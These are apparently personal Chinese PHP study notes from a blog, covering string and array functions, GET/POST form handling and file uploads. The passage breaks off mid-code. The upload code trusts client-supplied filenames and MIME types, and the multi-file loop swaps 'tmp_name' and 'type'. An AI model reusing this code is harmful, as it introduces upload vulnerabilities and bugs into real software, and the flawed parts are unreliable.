<p>中国|北京|顺义 == array(‘中国’,‘北京’,’顺义’);</p>
<p>Str_split(字符串,字符长度)：按照指定长度拆分字符串得到数组</p>
<p>2）截取函数：trim(), ltrim(), rtrim()</p>
<p>Trim(字符串[,指定字符])：本身默认是用来去除字符串两边的空格（中间不行），但是也可以指定要去除的内容，是按照指定的内容循环去除两边有的内容：直到碰到一个不是目标字符为止</p>
<p>Ltrim()：去除左边的</p>
<p>Rtrim()：去除右边的</p>
<p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210825160239038.png" alt="image-20210825160239038"></p>
<p>3）截取函数：substr(), strstr()</p>
<p>Substr(字符串,起始位置从0开始[,长度])：指定位置开始截取字符串，可以截取指定长度（不指定到最后）</p>
<p>Strstr(字符串,匹配字符)：从指定位置开始，截取到最后（可以用来去文件后缀名）</p>
<p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210825160752887.png" alt="image-20210825160752887"></p>
<p>4）大小转换函数：strtolower(), strtoupper(), ucfirst()</p>
<p>Strtolower：全部小写</p>
<p>Strtoupper：全部大写</p>
<p>Ucfirst：首字母大写</p>
<p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210825161752785.png" alt="image-20210825161752785"></p>
<p>5）查找函数：strpos(), strrpos()</p>
<p>Strpos(字符串，匹配字符)：判断字符在目标字符串中出现的位置（首次）</p>
<p>Strrpos(字符串，匹配字符)：判断字符在目标字符串中最后出现的位置</p>
<p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210825162203027.png" alt="image-20210825162203027"></p>
<p>6）替换函数：str_replace()</p>
<p>Str_replace(匹配目标,替换的内容,字符串本身)：将目标字符串中部分字符串进行替换</p>
<p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210825162322612.png" alt="image-20210825162322612"></p>
<p>7）格式化函数：printf(), sprintf()</p>
<p>Printf/sprintf(输出字符串有占位符,顺序占位内容..)：格式化输出数据</p>
<p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210825162541714.png" alt="image-20210825162541714"></p>
<p><img src="E:/sECRET/hexo/blog/source/_posts/clip_image012-1629878037632.jpg" alt="img"></p>
<p>8）其他：str_repeat(), str_shuffle()</p>
<p>Str_repeat()：重复某个字符串N次</p>
<p>Str_shuffle()：随机打乱字符串</p>
<p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210825162659626.png" alt="image-20210825162659626"></p>
<p>结构化定义字符串变量的规则：</p>
<blockquote>
<p>1、 结构化定义字符串对应的边界符有条件：</p>
<p>1.1  上边界符后面不能跟任何内容；</p>
<p>1.2  下边界符必须顶格：最左边；</p>
<p>1.3  下边界同样后面只能跟分号，不能跟任何内容；</p>
<p>2、 结构化定义字符串的内部（边界符之间）的所有内容都是字符串本身</p>
</blockquote>
<p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210825165125751.png" alt="image-20210825165125751"></p>
<p><strong>字符串转义</strong></p>
<p>转义的含义：在计算机通用协议中，有一些特定的方式定义的字母，系统会特定处理：通常这种方式都是使用反斜杠+字母（单词）的特性：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">\r\n：回车换行</span><br><span class="line">PHP在识别转义字符的时候也是使用同样的模式：反斜杠+字母</span><br><span class="line">在PHP中系统常用的转义符号：</span><br><span class="line">\’：在单引号字符串中显示单引号</span><br><span class="line">\”：在双引号字符串中显示双引号</span><br><span class="line">\r：代表回车（理论上是回到当前行的首位置）</span><br><span class="line">\n：代表新一行</span><br><span class="line">\t：类似tab键，输出4个空格</span><br><span class="line">\$：在PHP中使用$符号作为变量符号，因此需要特定识别</span><br><span class="line">1、	其中单引号中能够识别\’，而双引号中就不能识别\’</span><br><span class="line">2、	双引号中因为能够识别$符号，所以双引号中可以解析变量，而单引号不可以</span><br></pre></td></tr></table></figure>

<p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210825164718090.png" alt="image-20210825164718090"></p>
<h1 id="第三天"><a href="#第三天" class="headerlink" title="第三天"></a>第三天</h1><h5 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h5><p>   第一数组的三种方式：<code>$arr=array(1,2,3); $arr=[1,2,3]; $arr[]=1,$arr[]=2</code><br>   数组根据下标可分为：索引数组，关联数组，混合数组</p>
<p><strong>foreach循环</strong><br>   语法形式:foreach(数组变量 as [$key]=&gt;$value){循环体}</p>
<p>each函数的作用，list结构的使用</p>
<p>相关函数</p>
<p>1）排序函数：对数组元素进行排序，都是按照ASCII码进行比较，可以进行英文比较</p>
<p>sort()：顺序排序（下标重排）</p>
<p>rsort()：逆序排序</p>
<p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210826163701953.png" alt="image-20210826163701953"></p>
<p>asort()：顺序排序（下标保留）</p>
<p>arsort()：逆序排序</p>
<p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210826163746221.png" alt="image-20210826163746221"></p>
<p>ksort()：顺序排序：按照键名（下标）</p>
<p>krsort()：逆序排序</p>
<p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210826163835461.png" alt="image-20210826163835461"></p>
<p>shuffle()：随机打乱数组元素，数组下标会重排</p>
<p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210826163937743.png" alt="image-20210826163937743"></p>
<p>2）指针函数</p>
<p>reset()：重置指针，将数组指针回到首位</p>
<p>end()：重置指针，将数组指针指导最后一个元素</p>
<p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210826164154611.png" alt="image-20210826164154611"></p>
<p>next()：指针下移，取得下一个元素的值</p>
<p>prev()：指针上移，取得上一个元素的值</p>
<p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210826164245168.png" alt="image-20210826164245168"></p>
<p>current()：获取当前指针对应的元素值</p>
<p>key()：获取当前指针对应的下标值</p>
<p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210826164343904.png" alt="image-20210826164343904"></p>
<p>注意事项：next和prev会移动指针，有可能导致指针移动到最前或者最后（离开数组），导致数组不能使用，通过next和prev不能回到真确的指针位置。只能通过end或者reset进行指针重置</p>
<p>3）其他函数</p>
<p>count()：统计数组中元素的数量</p>
<p>array_push()：往数组中加入一个元素（数组后面）</p>
<p>array_pop()：从数组中取出一个元素（数组后面）</p>
<p>array_shift()：从数组中取出一个元素（数组前面）</p>
<p>array_unshift()：从数组中加入一个元素（数组前面）</p>
<p>PHP模拟数据结构：</p>
<p>栈：压栈，先进去后出来（FILO）</p>
<p><img src="E:/sECRET/hexo/blog/source/_posts/clip_image016-1629966823737.jpg" alt="img"></p>
<p>队列：排队，先进去的先出去（FIFO）</p>
<p><img src="E:/sECRET/hexo/blog/source/_posts/clip_image018-1629966823737.jpg" alt="img"></p>
<p>array_reverse()：数组元素反过来</p>
<p><img src="E:/sECRET/hexo/blog/source/_posts/clip_image020-1629966823737.jpg" alt="img"></p>
<p>in_array()：判断一个元素在数组中是否存在</p>
<p><img src="E:/sECRET/hexo/blog/source/_posts/clip_image022.jpg" alt="img"></p>
<p>array_keys()：获取一个数组的所有下标，返回一个索引数组</p>
<p>array_values()：获取一个数组的所有值，返回一个索引数组</p>
<p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210826165005282.png" alt="image-20210826165005282"></p>
<h5 id="表单传值"><a href="#表单传值" class="headerlink" title="表单传值"></a>表单传值</h5><p>概念</p>
<p>表单传值即浏览器通过表单元素将用户的选择或者输入的数据提交给后台服务器语言。</p>
<p>为什么使用表单传值</p>
<p>动态网站（Web2.0）的特点就是后台根据用户的需求定制数据，所谓的“需求”就是用户通过当前的选择或者输入的数据信息，表单就是这些数据的承载者。</p>
<p>表单传值方式</p>
<p><strong>GET传值</strong></p>
<p>1）form表单</p>
<p><code>&lt;form method=&quot;GET&quot;&gt;表单元素&lt;/form&gt;</code></p>
<p>2）a标签</p>
<p><code>&lt;a href=”www.itcast.cn/index.php?学科=PHP”&gt;</code></p>
<p>3）location对象的href属性</p>
<p><code>&lt;script&gt;location.href=”www.itcast.cn/index.php?data=PHP”&lt;/script&gt;</code></p>
<p>4）location对象的assign()方法</p>
<p><code>&lt;script&gt;location.assign(“www.itcast.cn/index.php?data=PHP”)&lt;/script&gt;</code></p>
<p><strong>POST传值</strong></p>
<p>1）post表单方式的基本设定</p>
<p><code>&lt;form method=&quot;POST&quot;&gt;表单元素&lt;/form&gt;</code></p>
<p>2）post方式跟get方式的区别</p>
<p>1、 Get传输的数据主要用来获取数据，不改变服务器上资源：get只是用来获取内容</p>
<p>2、 Post传输的数据主要用来增加数据，改变服务器上资源：POST会改变服务器上数据内容</p>
<p>3、 传输方式上post必须使用form表单，而get可以使用form表单和URL</p>
<p>4、 get传输数据可以在URL中对外可见，而post不可见：GET传值最终会在浏览器的地址栏中全部显示：?数据名=数据值&amp;数据名2=数据值2…</p>
<p>5、 get和post能传输的数据大小不同，get为2K，post理论无限制（事实上，GET和POST本身没有数据长度限制，但是浏览器厂家做了一些限制）</p>
<p>6、 get和post能够传输的数据格式有区别：get传输简单数据（数值/字符串），post可以提交复杂数据（二进制等）</p>
<p><strong>PHP接收数据的三种方式</strong></p>
<p>不管是$_GET/$_POST/$_REQUEST，三个都是PHP超全局（没有范围限制）预定义数组，表单元素的“name”属性的值作为数组的下标，而value属性对应的值就是数组的元素值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$_GET方式：接收GET方式提交的数据</span><br><span class="line">$_POST方式：接收POST方式提交的数据</span><br><span class="line">$_REQUEST方式：接收POST或者GET提交的所有数据</span><br><span class="line">1）$_REQUEST所存储数据的内容：将$_POST和$_GET合并存储到一个数组</span><br><span class="line">2）$_REQUEST和$_POST与$_GET的联系：如果GET和POST中有同名数组元素（下标），POST会覆盖GET（PHP中数组元素下标具有唯一性），这个可以在php.ini中进行配置</span><br></pre></td></tr></table></figure>

<p>GET/POST/REQUEST关系</p>
<p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210826170108563.png" alt="image-20210826170108563"></p>
<p>证明在REQUEST中POST会覆盖GET</p>
<p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210826183108358.png" alt="image-20210826183108358"></p>
<p>reques保留username是属于post提交   POST覆盖了GET</p>
<p><strong>PHP处理复选框数据</strong></p>
<p><strong>复选框表单项的命名方式</strong></p>
<p>复选框：通常是将一类内容以同样（同名）的形式传递给后台，数据库存储通常是一个字段存储。复选框的特点：选中才会提交</p>
<p>1、 在浏览器端，checkbox的name属性的值不论什么都会被浏览器毫无保留的提交</p>
<p>2、 在PHP中$_POST/$_GET都会对同名name属性进行覆盖</p>
<p>解决方案：浏览器不识别[]（浏览器不认为有特殊性），但是PHP认为[]有特殊性：系统自动认为该符号是数组的形式，所以PHP就会自动的将同名的但是带有[]的元素组合到一起形成一个数组</p>
<p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210826183141816.png" alt="image-20210826183141816"></p>
<p><strong>复选框数据的接收形式</strong></p>
<p>PHP会自动组合同名元素的为数组</p>
<p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210826183216058.png" alt="image-20210826183216058"></p>
<p><strong>复选框数据的常见处理</strong></p>
<p>1）单选按钮的数据处理</p>
<p>Radio button：可以出现多个选择项，但是只能选择其中一个</p>
<p>1、 表单中使用的name属性，使用同名即可：只能选中一个</p>
<p>2、 后台接收数据也不需要额外处理</p>
<p>3、 数据库存储的话只需要一个字段存储普通数据即可（数字或者字符串）</p>
<p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210826183545924.png" alt="image-20210826183545924"></p>
<p>4、 PHP拿到数据之后，组织SQL直接存储到数据表即可</p>
<p>2）多选按钮的数据处理</p>
<p>1、 表单中name属性使用数组格式：名字[]（一类复选框数据使用一个）</p>
<p>2、 后台接收到数据之后，是一个数组（数组不能存储到数据库）</p>
<p>3、 PHP需要将数组转换成指定格式的字符串：使用分隔符分隔每一个元素并且形成字符串：implode(’分隔符’ ,数组)</p>
<p><img src="E:/sECRET/hexo/blog/source/_posts/clip_image012-1629968091622.jpg" alt="img"></p>
<p>4、 PHP组织SQL直接存储到数据库</p>
<p>取出来复选框数据显示</p>
<p>1、 如果是反过来操作，那么取出数据之后使用explode把字符串变成数组</p>
<p><img src="E:/sECRET/hexo/blog/source/_posts/clip_image014-1629968091622.jpg" alt="img"></p>
<p>2、 在HTML显示当中，通过判断复选框元素是否在数组中存在，来确定复选框checkbox是否有checked=“checked”属性：in_array()</p>
<p>3）其他常规同名表单项的数据处理</p>
<p>除开radio button单选框和checkbox复选框，很少会出现同名的表单项。如果非要使用同名的来进行管理，那么可以采用checkbox方式进行操作</p>
<p>1、 表单中同名增加[]</p>
<p>2、 PHP接收时数组处理</p>
<p>3、 PHP转换成有格式的字符串</p>
<p>4、 数据库字符串存储</p>
<p><strong>复选框细节</strong></p>
<p>如果复选框没有选中，那么浏览器就不会提交。因此在PHP接收使用复选框（单选框）数据的时候，应该先判断是否存在该数据</p>
<p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210826185428003.png" alt="image-20210826185428003"></p>
<h5 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h5><p>原理</p>
<p>文件上传：文件从用户本地电脑通过传输方式（Web表单）保存到服务器所在电脑指定的目录下。</p>
<p>1、 增加文件上传的表单：浏览器请求一个服务器的HTML脚本（包含文件上传表单）</p>
<p>2、 用户从本地选择一个文件（点击上传框（按钮））</p>
<p>3、 用户点击上传：文件会通过物联网传输到服务器上</p>
<p>4、 服务器操作系统会将文件保存到临时目录：是以临时文件格式保存（windows下tmp）</p>
<p>5、 服务器脚本开始工作：判断文件有效</p>
<p>6、 服务器脚本将有效文件从临时目录移动到指定的目录下（完成）</p>
<p><img src="E:/sECRET/hexo/blog/source/_posts/clip_image018-1629968091622.jpg" alt="img"></p>
<p>表单写法</p>
<p>1）method属性：表单提交方式必须为POST</p>
<p>2）enctype属性：form表单属性，主要是规范表单数据的编码方式</p>
<p><img src="E:/sECRET/hexo/blog/source/_posts/clip_image020-1629968091622.jpg" alt="img"></p>
<p>3）上传表单：file表单</p>
<p><img src="E:/sECRET/hexo/blog/source/_posts/clip_image022-1629968091622.jpg" alt="img"></p>
<p>在PHP中，有一个预定义变量$_FILES是专门用来存储用户上传的文件的。</p>
<p><img src="E:/sECRET/hexo/blog/source/_posts/clip_image024-1629968091622.jpg" alt="img"></p>
<p>测试：如果没有enctype属性，那么上传文件会是什么样子？</p>
<p>$_FILES变量详解</p>
<p>1）name：文件在用户（浏览器端）电脑上实际存在的名字（实际用来保留后缀）</p>
<p>2）tmp_name：文件上传到服务器后操作系统保存的临时路径（实际用来给PHP后期使用）</p>
<p>3）type：MIME（多功能互联网邮件扩展）类型，用来在计算机中客户端识别文件类型（确定软件）</p>
<p>4）error：文件上传的代号，用来告知应用软件（PHP）文件接收过程中出现了什么问题（PHP后期根据代码进行文件判断）</p>
<p><img src="E:/sECRET/hexo/blog/source/_posts/clip_image026.jpg" alt="img"></p>
<p>5）size：文件大小（PHP根据实际需求来确定是否该保留）</p>
<p>移动临时文件到目标位置</p>
<p>文件上传之后会保存到$_FILES中，那么访问文件信息的形式就是$_FILES[‘表单name属性值’][‘元素信息’]</p>
<p>1）判断是否为上传的文件：is_uploaded_file()</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//1、取得文件信息</span><br><span class="line">	$file = $_FILES[&#x27;image&#x27;];</span><br><span class="line">	//2、判断是否是上传文件：临时文件</span><br><span class="line">	if(is_uploaded_file($file[&#x27;tmp_name&#x27;]))&#123;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>



<p>2）移动文件：move_uploaded_file()</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//2、判断是否是上传文件：临时文件</span><br><span class="line">	if(is_uploaded_file($file[&#x27;tmp_name&#x27;]))&#123;</span><br><span class="line">		//是上传文件</span><br><span class="line">		if(move_uploaded_file($file[&#x27;tmp_name&#x27;],&#x27;uploads/&#x27; . $file[&#x27;name&#x27;]))&#123;</span><br><span class="line">			echo &#x27;文件保存成功！&#x27;;</span><br><span class="line">		&#125;else&#123;</span><br><span class="line">			echo &#x27;文件保存失败！&#x27;;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>

<p>多文件上传</p>
<p>当商品需要上传多个图片进行展示的时候：那么需要使用多文件上传</p>
<p>​    针对一个内容但是不同文件说明：同名表单</p>
<p><img src="E:/sECRET/hexo/blog/source/_posts/clip_image032.jpg" alt="img"> </p>
<p>当商品需要进行多个维度图片说明的时候：需要使用多文件上传</p>
<p>​    针对是不同内容所以表单名字不一样：批量解决问题</p>
<p><img src="E:/sECRET/hexo/blog/source/_posts/clip_image034.jpg" alt="img"></p>
<p>多文件上传的$_FILES变量的数据结构形式</p>
<p>批量上传：同名表单：将表单名字形成一个数组，而且同时将文件对应的五个要素：name</p>
<p>Tmp_name、size、type、error都形成对应数量的数组，每个文件上传对应数组元素的下标都是一样的：name[0] 和type[0]是属于同一个文件</p>
<p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210826185545292.png" alt="image-20210826185545292"></p>
<p>1、 不同名多文件上传处理方式：按照表单名字从$_FILES中取出来就可以直接使用（明确知道表单中有多少个文件上传）；如果不确定表单中有多少个文件上传，不适合挨个去取（效率不高），可以通过遍历$_FILES数组，挨个取出来实现文件上传</p>
<p><img src="E:/sECRET/hexo/blog/source/_posts/clip_image043.jpg" alt="img"></p>
<p>2、 同名多文件上传：想办法得到一个文件对应的五个元素数组。从$_FILES中把对应的name\tmp_name\size\error\type挨个取出来，然后存放到不同的数组中。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">//同名文件遍历处理方式</span><br><span class="line">	//此时遍历$_FILES没有意义，只有一个数组元素；应该变量$_FILES[&#x27;userfile&#x27;][&#x27;任意一个要素：name|tmp_name|size|error|type&#x27;]</span><br><span class="line">	//判断元素存在而且是数组：name有代表是文件，name元素有多个（数组）代表是同名批量上传</span><br><span class="line">	if(isset($_FILES[&#x27;image&#x27;][&#x27;name&#x27;]) &amp;&amp; is_array($_FILES[&#x27;image&#x27;][&#x27;name&#x27;]))&#123;</span><br><span class="line">		//遍历构造数组元素</span><br><span class="line">		$images = array();		//存储所有的文件信息，一个元素代表一个文件（数组）</span><br><span class="line">		foreach($_FILES[&#x27;image&#x27;][&#x27;name&#x27;] as $k =&gt; $file)&#123;</span><br><span class="line">			$images[] = array(</span><br><span class="line">				&#x27;name&#x27; =&gt; $file,</span><br><span class="line">				&#x27;tmp_name&#x27; =&gt; $_FILES[&#x27;image&#x27;][&#x27;type&#x27;][$k],</span><br><span class="line">				&#x27;type&#x27; =&gt; $_FILES[&#x27;image&#x27;][&#x27;tmp_name&#x27;][$k],</span><br><span class="line">				&#x27;error&#x27; =&gt; $_FILES[&#x27;image&#x27;][&#x27;error&#x27;][$k],</span><br><span class="line">				&#x27;size&#x27; =&gt; $_FILES[&#x27;image&#x27;][&#x27;size&#x27;][$k]</span><br><span class="line">			);</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>  需要上传的文件信息：对应的5个元素的数组</p>
<p>  ​    1、 文件类型是否合适？外部指定MIME类型</p>
<p>  ​    2、 文件存储到什么位置？外部指定</p>
<p>  ​    3、 文件格式限制（文件后缀）？外部限定</p>
<p>  ​    4、 文件大小限制？外部指定</p>
<p>  结果：实现文件上传</p>
<p>  ​    1、 成功：结果能够在以后看到：需要将文件的路径和文件名字返回（存储到数据库）</p>
<p>  ​    2、 失败：返回false，指定错误原因（引用参数）</p>
</blockquote>
<p>1）封装出一个上传函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * 实现文件上传（单）</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span>1 array $file，需要上传的文件信息：一维5元素数组（name\tmp_name\error\size\type)</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span>2 array $allow_type，允许上传的MIME类型</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span>3 string $path，存储的路径</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span>4 string &amp;$error，如果出现错误的原因</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span>5 array $allow_format = array()，允许上传的文件格式</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span>6 int $max_size = 2000000，允许上传的最大值</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">upload_single</span>(<span class="params"><span class="variable">$file</span>,<span class="variable">$allow_type</span>,<span class="variable">$path</span>,&amp;<span class="variable">$error</span>,<span class="variable">$allow_format</span> = <span class="keyword">array</span>(<span class="params"></span>),<span class="variable">$max_size</span> = <span class="number">2000000</span></span>)</span>&#123;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>

<p>2）判断文件是否有效</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!is_array(<span class="variable">$file</span>) || !<span class="keyword">isset</span>(<span class="variable">$file</span>[<span class="string">&#x27;error&#x27;</span>]))&#123;</span><br><span class="line">			<span class="comment">//文件无效</span></span><br><span class="line">			<span class="variable">$error</span> = <span class="string">&#x27;不是一个有效的上传文件！&#x27;</span>;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">			&#125;</span><br></pre></td></tr></table></figure>

<p>3）判断保存路径是否有效</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!is_dir(<span class="variable">$path</span>))&#123;</span><br><span class="line">			<span class="comment">//路径不存在</span></span><br><span class="line">			<span class="variable">$error</span> = <span class="string">&#x27;文件存储路径不存在！&#x27;</span>;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>



<p>4）判断文件本身上传的过程中是否有错误：error</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>(<span class="variable">$file</span>[<span class="string">&#x27;error&#x27;</span>])&#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">			<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">				<span class="variable">$error</span> = <span class="string">&#x27;文件超出服务器允许大小！&#x27;</span>;</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">				<span class="variable">$error</span> = <span class="string">&#x27;文件上传过程中出现问题，只上传一部分！&#x27;</span>;</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">				<span class="variable">$error</span> = <span class="string">&#x27;用户没有选中要上传的文件！&#x27;</span>;</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">			<span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">				<span class="variable">$error</span> = <span class="string">&#x27;文件保存失败！&#x27;</span>;</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>



<p>5）文件类型的处理：通过MIME匹配即可</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!in_array(<span class="variable">$file</span>[<span class="string">&#x27;type&#x27;</span>],<span class="variable">$allow_type</span>))&#123;</span><br><span class="line">			<span class="comment">//该文件类型不允许上传</span></span><br><span class="line">			<span class="variable">$error</span> = <span class="string">&#x27;当前文件类型不允许上传！&#x27;</span>;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>

<p>6）文件格式的处理：后缀名的问题</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//判断后缀是否允许</span></span><br><span class="line">		<span class="comment">//取出后缀</span></span><br><span class="line">		<span class="variable">$ext</span> = ltrim(strrchr(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>],<span class="string">&#x27;.&#x27;</span>),<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">		<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$allow_format</span>) &amp;&amp; !in_array(<span class="variable">$ext</span>,<span class="variable">$allow_format</span>))&#123;</span><br><span class="line">			<span class="comment">//不允许上传</span></span><br><span class="line">			<span class="variable">$error</span> = <span class="string">&#x27;当前文件的格式不允许上传！&#x27;</span>;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>



<p>7）文件大小的处理</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//判断当前文件大小是否满足当前需求</span></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="variable">$max_size</span>)&#123;</span><br><span class="line">			<span class="comment">//文件过大</span></span><br><span class="line">			<span class="variable">$error</span> = <span class="string">&#x27;当前上传的文件超出大小，最大允许&#x27;</span> . <span class="variable">$max_size</span> . <span class="string">&#x27;字节!&#x27;</span>;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>



<p>8）移动到指定目录</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//移动到指定目录</span></span><br><span class="line">		<span class="keyword">if</span>(!is_uploaded_file(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>]))&#123;</span><br><span class="line">			<span class="comment">//文件不是上传的</span></span><br><span class="line">			<span class="variable">$error</span> = <span class="string">&#x27;错误：不是上传文件！&#x27;</span>;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>



<p>8）命名冲突的处理：上传同名文件？中文名字文件怎么办？</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//构造文件名字：类型_年月日+随机字符串.$ext</span></span><br><span class="line">		<span class="variable">$fullname</span> = strstr(<span class="variable">$file</span>[<span class="string">&#x27;type&#x27;</span>],<span class="string">&#x27;/&#x27;</span>,<span class="literal">TRUE</span>) . date(<span 